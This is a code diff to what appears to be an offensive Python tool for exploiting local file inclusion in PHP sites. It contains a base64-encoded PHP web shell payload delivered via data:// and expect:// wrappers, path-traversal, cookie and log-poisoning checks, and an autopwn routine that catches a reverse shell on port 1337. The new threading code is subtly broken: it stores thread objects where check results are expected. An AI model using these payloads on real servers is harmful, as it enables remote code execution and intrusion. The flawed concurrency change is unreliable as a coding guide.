@@ -37,7 +37,7 @@ class Payload:
 		self.filterBase = quote("php://filter/read=convert.base64-encode/resource=")
 
 		# Headers. One is without url encoding beacause it encodes also the base64 and the server doesn't like that
-		self.phpHeaders = [quote("expect://id"), "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&cmd=id"]
+		self.phpHeaders = [quote("expect://id"), "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id"]
 
 		# PHPSESSID Cookie
 		self.cookiePath = "/var/lib/php/sessions/sess_"
@@ -55,7 +55,7 @@ class Payload:
 
 
 	def InvokeShell(self, exploit, payload):
-		#Give some time to bind the listener
+		# Give some time to bind the listener
 		time.sleep(2)
 		print(colored("[+]", 'green') + " Triggering payload... " + exploit + payload)
 		self.hit(exploit + payload)
@@ -95,15 +95,19 @@ class Payload:
 		return payloads
 
 
-
+	# Added thread support for the attacks which speeds things up significantly!
 	def Attack(self, attempt_shell=False, mode=0, force=False):
 		if not force and not self.urlCheck():
 			return
-		self.dirTraversalCheck()
-		headerres = self.headerCheck()
-		self.filterCheck()
-		cookieres = self.cookieCheck()
-		logres = self.logPoisonCheck()
+		dirThread = threading.Thread(target=self.dirTraversalCheck, args=[])
+		dirThread.start()
+		headerres = threading.Thread(target=self.headerCheck, args=[])
+		headerres.start()
+		filterThread = threading.Thread(target=self.filterCheck, args=[])
+		filterThread.start()
+		cookieres = threading.Thread(target=self.cookieCheck, args=[])
+		cookieres.start()
+		logres = self.logPoisonCheck() # if I put threading in this function it breaks!
 
 		if attempt_shell:
 			self.autopwn(attempt_shell, cookieres, headerres, logres, mode)
@@ -132,7 +136,7 @@ class Payload:
 			print(colored(f"[+]", 'green') + " Attempting to pwn through vulnerable cookie: {cookie}")
 
 
-		ExploitThread = threading.Thread(target=self.InvokeShell, args=[exploit, payload]) #It works, don't touch!
+		ExploitThread = threading.Thread(target=self.InvokeShell, args=[exploit, payload]) #It works, don't touch it!
 		ExploitThread.start()
 		# Spin up the listener to catch the revshell and fire out the exploit
 		l = listen(1337)
